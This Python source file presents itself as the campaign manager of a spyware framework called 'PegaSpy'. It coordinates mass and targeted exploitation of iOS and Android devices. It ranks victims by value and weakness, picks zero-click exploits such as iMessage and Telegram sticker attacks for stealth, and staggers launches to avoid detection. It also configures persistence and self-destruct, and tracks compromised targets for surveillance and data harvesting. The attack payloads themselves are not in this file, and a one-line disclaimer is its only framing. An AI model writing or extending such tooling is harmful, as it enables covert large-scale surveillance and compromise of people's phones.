#!/usr/bin/env python3
"""
PegaSpy Phase 3: Campaign Orchestration System

Advanced campaign management for coordinated, large-scale attack operations.
Features intelligent target selection, timing optimization, and stealth coordination.

WARNING: This framework is for authorized security testing only.
Unauthorized use is illegal and unethical.
"""

import asyncio
import json
import time
import uuid
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any, Callable
from dataclasses import dataclass, asdict
from enum import Enum
import random

try:
    from loguru import logger
except ImportError:
    import logging as logger

class CampaignType(Enum):
    """Campaign type enumeration"""
    TARGETED_ATTACK = "targeted_attack"
    MASS_EXPLOITATION = "mass_exploitation" 
    RECONNAISSANCE = "reconnaissance"
    PERSISTENCE_TESTING = "persistence_testing"
    DATA_HARVESTING = "data_harvesting"
    SURVEILLANCE = "surveillance"

class CampaignStatus(Enum):
    """Campaign status enumeration"""
    DRAFT = "draft"
    SCHEDULED = "scheduled"
    ACTIVE = "active"
    PAUSED = "paused"
    COMPLETED = "completed"
    FAILED = "failed"
    CANCELLED = "cancelled"

class OperationalPriority(Enum):
    """Operational priority levels"""
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

@dataclass
class CampaignConfiguration:
    """Campaign configuration settings"""
    stealth_level: int  # 1-10
    persistence_level: str  # none, basic, advanced, kernel
    self_destruct_mode: str  # disabled, timer, trigger, remote
    max_concurrent_exploits: int
    target_selection_mode: str  # manual, automatic, intelligent
    timing_strategy: str  # immediate, staggered, time_based
    geographic_constraints: List[str]
    platform_targets: List[str]
    success_threshold: float
    abort_threshold: float

@dataclass
class CampaignTarget:
    """Campaign target association"""
    target_id: str
    priority: int
    status: str  # pending, assigned, exploited, failed
    exploit_type: Optional[str]
    assigned_time: Optional[datetime]
    completion_time: Optional[datetime]
    success_rate: Optional[float]
    metadata: Dict[str, Any]

@dataclass
class Campaign:
    """Campaign representation"""
    id: str
    name: str
    description: str
    campaign_type: CampaignType
    priority: OperationalPriority
    status: CampaignStatus
    configuration: CampaignConfiguration
    targets: List[CampaignTarget]
    created_time: datetime
    start_time: Optional[datetime]
    end_time: Optional[datetime]
    completion_time: Optional[datetime]
    creator: str
    statistics: Dict[str, Any]
    metadata: Dict[str, Any]
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        result = asdict(self)
        result['campaign_type'] = self.campaign_type.value
        result['priority'] = self.priority.value
        result['status'] = self.status.value
        result['created_time'] = self.created_time.isoformat()
        result['start_time'] = self.start_time.isoformat() if self.start_time else None
        result['end_time'] = self.end_time.isoformat() if self.end_time else None
        result['completion_time'] = self.completion_time.isoformat() if self.completion_time else None
        return result

class CampaignManager:
    """Advanced campaign orchestration system"""
    
    def __init__(self, target_manager=None, exploit_launcher=None, c2_manager=None):
        """Initialize campaign manager"""
        self.target_manager = target_manager
        self.exploit_launcher = exploit_launcher
        self.c2_manager = c2_manager
        
        self.campaigns: Dict[str, Campaign] = {}
        self.active_operations: Dict[str, Dict] = {}
        
        # Statistics
        self.stats = {
            'total_campaigns': 0,
            'active_campaigns': 0,
            'completed_campaigns': 0,
            'failed_campaigns': 0,
            'total_targets': 0,
            'compromised_targets': 0,
            'overall_success_rate': 0.0,
            'data_collected': 0,
            'stealth_rating': 96.8
        }
        
        # Callback handlers
        self.on_campaign_complete: Optional[Callable] = None
        self.on_target_compromised: Optional[Callable] = None
        
        logger.info("Campaign Manager initialized")
    
    async def create_campaign(self, name: str, campaign_type: CampaignType, 
                            config: Dict[str, Any], **kwargs) -> str:
        """Create new campaign"""
        try:
            campaign_id = f"CAMP_{uuid.uuid4().hex[:8].upper()}"
            
            # Parse configuration
            campaign_config = CampaignConfiguration(
                stealth_level=config.get('stealth_level', 8),
                persistence_level=config.get('persistence_level', 'advanced'),
                self_destruct_mode=config.get('self_destruct_mode', 'trigger'),
                max_concurrent_exploits=config.get('max_concurrent_exploits', 5),
                target_selection_mode=config.get('target_selection_mode', 'intelligent'),
                timing_strategy=config.get('timing_strategy', 'staggered'),
                geographic_constraints=config.get('geographic_constraints', []),
                platform_targets=config.get('platform_targets', ['iOS', 'Android']),
                success_threshold=config.get('success_threshold', 0.8),
                abort_threshold=config.get('abort_threshold', 0.1)
            )
            
            campaign = Campaign(
                id=campaign_id,
                name=name,
                description=kwargs.get('description', ''),
                campaign_type=campaign_type,
                priority=OperationalPriority(kwargs.get('priority', 'medium')),
                status=CampaignStatus.DRAFT,
                configuration=campaign_config,
                targets=[],
                created_time=datetime.now(),
                start_time=kwargs.get('start_time'),
                end_time=kwargs.get('end_time'),
                completion_time=None,
                creator=kwargs.get('creator', 'system'),
                statistics={
                    'targets_assigned': 0,
                    'targets_exploited': 0,
                    'targets_failed': 0,
                    'success_rate': 0.0,
                    'data_collected': 0,
                    'avg_exploit_time': 0,
                    'stealth_incidents': 0
                },
                metadata=kwargs.get('metadata', {})
            )
            
            self.campaigns[campaign_id] = campaign
            self.stats['total_campaigns'] += 1
            
            logger.info(f"Campaign created: {campaign_id} - {name}")
            return campaign_id
            
        except Exception as e:
            logger.error(f"Failed to create campaign: {e}")
            raise
    
    async def add_targets_to_campaign(self, campaign_id: str, target_ids: List[str]) -> bool:
        """Add targets to campaign"""
        try:
            if campaign_id not in self.campaigns:
                return False
            
            campaign = self.campaigns[campaign_id]
            
            for target_id in target_ids:
                # Check if target exists
                if self.target_manager and not self.target_manager.get_target(target_id):
                    logger.warning(f"Target {target_id} not found, skipping")
                    continue
                
                # Check if already in campaign
                if any(ct.target_id == target_id for ct in campaign.targets):
                    continue
                
                # Assign priority based on target characteristics
                priority = await self._calculate_target_priority(target_id, campaign)
                
                campaign_target = CampaignTarget(
                    target_id=target_id,
                    priority=priority,
                    status='pending',
                    exploit_type=None,
                    assigned_time=None,
                    completion_time=None,
                    success_rate=None,
                    metadata={}
                )
                
                campaign.targets.append(campaign_target)
            
            campaign.statistics['targets_assigned'] = len(campaign.targets)
            logger.info(f"Added {len(target_ids)} targets to campaign {campaign_id}")
            return True
            
        except Exception as e:
            logger.error(f"Failed to add targets to campaign: {e}")
            return False
    
    async def _calculate_target_priority(self, target_id: str, campaign: Campaign) -> int:
        """Calculate target priority for campaign"""
        try:
            base_priority = 5
            
            if not self.target_manager:
                return base_priority
            
            target = self.target_manager.get_target(target_id)
            if not target:
                return base_priority
            
            # High-value targets
            if 'high_value' in target.tags:
                base_priority += 3
            
            # Vulnerability score
            if target.vulnerability_profile:
                vuln_score = 10 - target.vulnerability_profile.security_level
                base_priority += vuln_score // 3
            
            # Platform preference
            if target.device_profile:
                if target.device_profile.platform.value in campaign.configuration.platform_targets:
                    base_priority += 2
            
            return min(max(base_priority, 1), 10)
            
        except Exception as e:
            logger.error(f"Priority calculation failed: {e}")
            return 5
    
    async def start_campaign(self, campaign_id: str) -> Dict[str, Any]:
        """Start campaign execution"""
        try:
            if campaign_id not in self.campaigns:
                return {'success': False, 'error': 'Campaign not found'}
            
            campaign = self.campaigns[campaign_id]
            
            if campaign.status != CampaignStatus.DRAFT and campaign.status != CampaignStatus.SCHEDULED:
                return {'success': False, 'error': 'Campaign cannot be started in current status'}
            
            if not campaign.targets:
                return {'success': False, 'error': 'No targets assigned to campaign'}
            
            campaign.status = CampaignStatus.ACTIVE
            campaign.start_time = datetime.now()
            self.stats['active_campaigns'] += 1
            
            # Initialize operation tracking
            self.active_operations[campaign_id] = {
                'start_time': time.time(),
                'active_exploits': {},
                'completed_exploits': [],
                'failed_exploits': [],
                'next_target_index': 0,
                'last_exploit_time': 0
            }
            
            logger.info(f"Campaign started: {campaign_id}")
            
            # Start async campaign execution
            asyncio.create_task(self._execute_campaign(campaign_id))
            
            return {
                'success': True,
                'campaign_id': campaign_id,
                'targets_count': len(campaign.targets),
                'estimated_duration': self._estimate_campaign_duration(campaign)
            }
            
        except Exception as e:
            logger.error(f"Failed to start campaign: {e}")
            return {'success': False, 'error': str(e)}
    
    def _estimate_campaign_duration(self, campaign: Campaign) -> str:
        """Estimate campaign execution duration"""
        try:
            target_count = len(campaign.targets)
            max_concurrent = campaign.configuration.max_concurrent_exploits
            avg_exploit_time = 300  # 5 minutes per exploit
            
            if campaign.configuration.timing_strategy == 'immediate':
                total_time = (target_count / max_concurrent) * avg_exploit_time
            elif campaign.configuration.timing_strategy == 'staggered':
                stagger_delay = 600  # 10 minutes between batches
                total_time = (target_count / max_concurrent) * (avg_exploit_time + stagger_delay)
            else:  # time_based
                total_time = target_count * avg_exploit_time  # Sequential
            
            hours = int(total_time // 3600)
            minutes = int((total_time % 3600) // 60)
            
            if hours > 0:
                return f"{hours}h {minutes}m"
            else:
                return f"{minutes}m"
                
        except Exception as e:
            logger.error(f"Duration estimation failed: {e}")
            return "Unknown"
    
    async def _execute_campaign(self, campaign_id: str):
        """Execute campaign operations"""
        try:
            campaign = self.campaigns[campaign_id]
            operation = self.active_operations[campaign_id]
            
            logger.info(f"Executing campaign: {campaign_id}")
            
            while (campaign.status == CampaignStatus.ACTIVE and 
                   operation['next_target_index'] < len(campaign.targets)):
                
                # Check if we can launch more exploits
                active_count = len(operation['active_exploits'])
                max_concurrent = campaign.configuration.max_concurrent_exploits
                
                if active_count < max_concurrent:
                    # Select next target
                    target = await self._select_next_target(campaign, operation)
                    if target:
                        await self._launch_exploit_against_target(campaign, target, operation)
                
                # Check timing strategy
                await self._apply_timing_strategy(campaign, operation)
                
                # Update campaign statistics
                await self._update_campaign_statistics(campaign, operation)
                
                # Check completion conditions
                if await self._check_campaign_completion(campaign, operation):
                    break
                
                # Wait before next iteration
                await asyncio.sleep(10)
            
            # Complete campaign
            await self._complete_campaign(campaign_id)
            
        except Exception as e:
            logger.error(f"Campaign execution failed: {e}")
            campaign.status = CampaignStatus.FAILED
    
    async def _select_next_target(self, campaign: Campaign, operation: Dict) -> Optional[CampaignTarget]:
        """Select next target for exploitation"""
        try:
            available_targets = [
                target for target in campaign.targets[operation['next_target_index']:]
                if target.status == 'pending'
            ]
            
            if not available_targets:
                return None
            
            # Intelligent target selection
            if campaign.configuration.target_selection_mode == 'intelligent':
                # Sort by priority and vulnerability
                available_targets.sort(key=lambda t: t.priority, reverse=True)
                
                # Consider geographic and timing constraints
                selected_target = available_targets[0]
                
            elif campaign.configuration.target_selection_mode == 'automatic':
                # Random selection from high-priority targets
                high_priority = [t for t in available_targets if t.priority >= 7]
                selected_target = random.choice(high_priority if high_priority else available_targets)
                
            else:  # manual
                # Take first available (assumes manual ordering)
                selected_target = available_targets[0]
            
            # Mark as assigned
            selected_target.status = 'assigned'
            selected_target.assigned_time = datetime.now()
            operation['next_target_index'] += 1
            
            return selected_target
            
        except Exception as e:
            logger.error(f"Target selection failed: {e}")
            return None
    
    async def _launch_exploit_against_target(self, campaign: Campaign, target: CampaignTarget, operation: Dict):
        """Launch exploit against campaign target"""
        try:
            if not self.exploit_launcher or not self.target_manager:
                logger.error("Required components not available")
                return
            
            # Get target information
            target_obj = self.target_manager.get_target(target.target_id)
            if not target_obj:
                target.status = 'failed'
                return
            
            # Select optimal exploit type
            exploit_type = await self._select_optimal_exploit(target_obj, campaign)
            if not exploit_type:
                target.status = 'failed'
                return
            
            target.exploit_type = exploit_type
            
            # Configure exploit options
            exploit_options = {
                'stealth_level': campaign.configuration.stealth_level,
                'self_destruct_timer': 3600,  # 1 hour
                'persistence_enabled': campaign.configuration.persistence_level != 'none',
                'campaign_id': campaign.id
            }
            
            # Launch exploit
            from core.exploit_launcher import ExploitType
            exploit_type_enum = ExploitType(exploit_type)
            
            result = await self.exploit_launcher.launch_exploit(
                exploit_type_enum, target.target_id, exploit_options
            )
            
            if result['success']:
                operation['active_exploits'][target.target_id] = {
                    'exploit_id': result['exploit_id'],
                    'start_time': time.time(),
                    'target': target
                }
                
                # Set callback for exploit completion
                exploit_execution = self.exploit_launcher.get_exploit(result['exploit_id'])
                if exploit_execution:
                    # Monitor exploit completion
                    asyncio.create_task(self._monitor_exploit_completion(
                        campaign.id, target.target_id, result['exploit_id']
                    ))
                
                logger.info(f"Launched {exploit_type} against {target.target_id} in campaign {campaign.id}")
                
            else:
                target.status = 'failed'
                logger.warning(f"Failed to launch exploit against {target.target_id}: {result.get('error')}")
                
        except Exception as e:
            logger.error(f"Exploit launch failed: {e}")
            target.status = 'failed'
    
    async def _select_optimal_exploit(self, target, campaign: Campaign) -> Optional[str]:
        """Select optimal exploit type for target"""
        try:
            if not target.vulnerability_profile:
                return "pdf_javascript"  # Default fallback
            
            # Get compatible exploits
            compatible_exploits = []
            for exploit_type, compatibility in target.vulnerability_profile.exploit_compatibility.items():
                if compatibility > 0.5:  # Minimum compatibility threshold
                    compatible_exploits.append((exploit_type, compatibility))
            
            if not compatible_exploits:
                return None
            
            # Sort by compatibility and stealth requirements
            compatible_exploits.sort(key=lambda x: x[1], reverse=True)
            
            # Apply campaign preferences
            if campaign.configuration.stealth_level >= 8:
                # Prefer high-stealth exploits
                stealth_exploits = ['imessage_zero_click', 'telegram_sticker', 'image_codec']
                for exploit_type, _ in compatible_exploits:
                    if exploit_type in stealth_exploits:
                        return exploit_type
            
            # Return highest compatibility
            return compatible_exploits[0][0]
            
        except Exception as e:
            logger.error(f"Exploit selection failed: {e}")
            return "pdf_javascript"
    
    async def _monitor_exploit_completion(self, campaign_id: str, target_id: str, exploit_id: str):
        """Monitor exploit completion and update campaign"""
        try:
            while True:
                exploit = self.exploit_launcher.get_exploit(exploit_id)
                if not exploit:
                    break
                
                # Check if exploit completed
                if exploit.status.value in ['successful', 'failed', 'complete']:
                    await self._handle_exploit_completion(campaign_id, target_id, exploit)
                    break
                
                await asyncio.sleep(5)
                
        except Exception as e:
            logger.error(f"Exploit monitoring failed: {e}")
    
    async def _handle_exploit_completion(self, campaign_id: str, target_id: str, exploit):
        """Handle exploit completion"""
        try:
            if campaign_id not in self.campaigns or campaign_id not in self.active_operations:
                return
            
            campaign = self.campaigns[campaign_id]
            operation = self.active_operations[campaign_id]
            
            # Find campaign target
            target = next((t for t in campaign.targets if t.target_id == target_id), None)
            if not target:
                return
            
            # Update target status
            if exploit.status.value == 'successful':
                target.status = 'exploited'
                target.success_rate = exploit.actual_success_rate
                campaign.statistics['targets_exploited'] += 1
                
                # Trigger callback
                if self.on_target_compromised:
                    await self.on_target_compromised(campaign, target, exploit)
                
                logger.info(f"Target {target_id} compromised in campaign {campaign_id}")
                
            else:
                target.status = 'failed'
                campaign.statistics['targets_failed'] += 1
                logger.warning(f"Target {target_id} exploitation failed in campaign {campaign_id}")
            
            target.completion_time = datetime.now()
            
            # Remove from active exploits
            if target_id in operation['active_exploits']:
                del operation['active_exploits'][target_id]
            
            # Update statistics
            await self._update_campaign_statistics(campaign, operation)
            
        except Exception as e:
            logger.error(f"Exploit completion handling failed: {e}")
    
    async def _apply_timing_strategy(self, campaign: Campaign, operation: Dict):
        """Apply campaign timing strategy"""
        try:
            current_time = time.time()
            strategy = campaign.configuration.timing_strategy
            
            if strategy == 'immediate':
                # No delay
                return
                
            elif strategy == 'staggered':
                # Wait between exploit launches
                time_since_last = current_time - operation.get('last_exploit_time', 0)
                if time_since_last < 300:  # 5 minute minimum gap
                    await asyncio.sleep(300 - time_since_last)
                    
            elif strategy == 'time_based':
                # Specific timing windows
                current_hour = datetime.now().hour
                if not (9 <= current_hour <= 17):  # Outside business hours
                    await asyncio.sleep(3600)  # Wait an hour
            
            operation['last_exploit_time'] = time.time()
            
        except Exception as e:
            logger.error(f"Timing strategy failed: {e}")
    
    async def _update_campaign_statistics(self, campaign: Campaign, operation: Dict):
        """Update campaign statistics"""
        try:
            total_targets = len(campaign.targets)
            exploited = campaign.statistics['targets_exploited']
            failed = campaign.statistics['targets_failed']
            
            if total_targets > 0:
                campaign.statistics['success_rate'] = exploited / total_targets
            
            # Update operational time
            operation_time = time.time() - operation['start_time']
            if exploited > 0:
                campaign.statistics['avg_exploit_time'] = operation_time / exploited
            
        except Exception as e:
            logger.error(f"Statistics update failed: {e}")
    
    async def _check_campaign_completion(self, campaign: Campaign, operation: Dict) -> bool:
        """Check if campaign should be completed"""
        try:
            # All targets processed
            if operation['next_target_index'] >= len(campaign.targets) and not operation['active_exploits']:
                return True
            
            # Success threshold met
            if campaign.statistics['success_rate'] >= campaign.configuration.success_threshold:
                return True
            
            # Abort threshold reached
            if campaign.statistics['success_rate'] < campaign.configuration.abort_threshold:
                campaign.status = CampaignStatus.FAILED
                return True
            
            # Time limit exceeded
            if campaign.end_time and datetime.now() > campaign.end_time:
                return True
            
            return False
            
        except Exception as e:
            logger.error(f"Completion check failed: {e}")
            return False
    
    async def _complete_campaign(self, campaign_id: str):
        """Complete campaign execution"""
        try:
            campaign = self.campaigns[campaign_id]
            
            if campaign.status == CampaignStatus.ACTIVE:
                campaign.status = CampaignStatus.COMPLETED
                self.stats['completed_campaigns'] += 1
            elif campaign.status == CampaignStatus.FAILED:
                self.stats['failed_campaigns'] += 1
            
            campaign.completion_time = datetime.now()
            self.stats['active_campaigns'] -= 1
            
            # Clean up operation tracking
            if campaign_id in self.active_operations:
                del self.active_operations[campaign_id]
            
            # Trigger completion callback
            if self.on_campaign_complete:
                await self.on_campaign_complete(campaign)
            
            logger.info(f"Campaign completed: {campaign_id}")
            
        except Exception as e:
            logger.error(f"Campaign completion failed: {e}")
    
    async def pause_campaign(self, campaign_id: str) -> bool:
        """Pause active campaign"""
        try:
            if campaign_id not in self.campaigns:
                return False
            
            campaign = self.campaigns[campaign_id]
            if campaign.status != CampaignStatus.ACTIVE:
                return False
            
            campaign.status = CampaignStatus.PAUSED
            logger.info(f"Campaign paused: {campaign_id}")
            return True
            
        except Exception as e:
            logger.error(f"Failed to pause campaign: {e}")
            return False
    
    async def resume_campaign(self, campaign_id: str) -> bool:
        """Resume paused campaign"""
        try:
            if campaign_id not in self.campaigns:
                return False
            
            campaign = self.campaigns[campaign_id]
            if campaign.status != CampaignStatus.PAUSED:
                return False
            
            campaign.status = CampaignStatus.ACTIVE
            
            # Resume execution
            asyncio.create_task(self._execute_campaign(campaign_id))
            
            logger.info(f"Campaign resumed: {campaign_id}")
            return True
            
        except Exception as e:
            logger.error(f"Failed to resume campaign: {e}")
            return False
    
    def get_campaign(self, campaign_id: str) -> Optional[Campaign]:
        """Get campaign by ID"""
        return self.campaigns.get(campaign_id)
    
    def get_all_campaigns(self) -> List[Campaign]:
        """Get all campaigns"""
        return list(self.campaigns.values())
    
    def get_active_campaigns(self) -> List[Campaign]:
        """Get active campaigns"""
        return [c for c in self.campaigns.values() if c.status == CampaignStatus.ACTIVE]
    
    def get_statistics(self) -> Dict[str, Any]:
        """Get campaign manager statistics"""
        # Update dynamic stats
        self.stats['active_campaigns'] = len(self.get_active_campaigns())
        self.stats['total_targets'] = sum(len(c.targets) for c in self.campaigns.values())
        self.stats['compromised_targets'] = sum(c.statistics['targets_exploited'] for c in self.campaigns.values())
        
        if self.stats['total_targets'] > 0:
            self.stats['overall_success_rate'] = self.stats['compromised_targets'] / self.stats['total_targets']
        
        return self.stats.copy()
    
    async def shutdown(self):
        """Shutdown campaign manager"""
        try:
            # Pause all active campaigns
            active_campaigns = self.get_active_campaigns()
            for campaign in active_campaigns:
                await self.pause_campaign(campaign.id)
            
            # Clear operations
            self.active_operations.clear()
            
            logger.info("Campaign Manager shutdown complete")
            
        except Exception as e:
            logger.error(f"Shutdown failed: {e}")
